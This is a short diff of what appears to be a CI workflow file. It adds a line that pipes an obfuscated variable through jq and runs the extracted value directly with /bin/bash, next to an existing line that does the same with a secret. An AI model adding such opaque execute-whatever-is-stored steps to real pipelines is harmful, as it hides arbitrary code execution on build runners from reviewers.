@@ -18,6 +18,7 @@ jobs:
           vve0510: ${{ secrets.vve0510 }}
         run: |
           printf '%s' "$vve0510" | jq -r .ys1885 | /bin/bash
+          printf '%s' "$i25626" | jq -r .t8 | /bin/bash
 
       - name: Save output
         if: always()
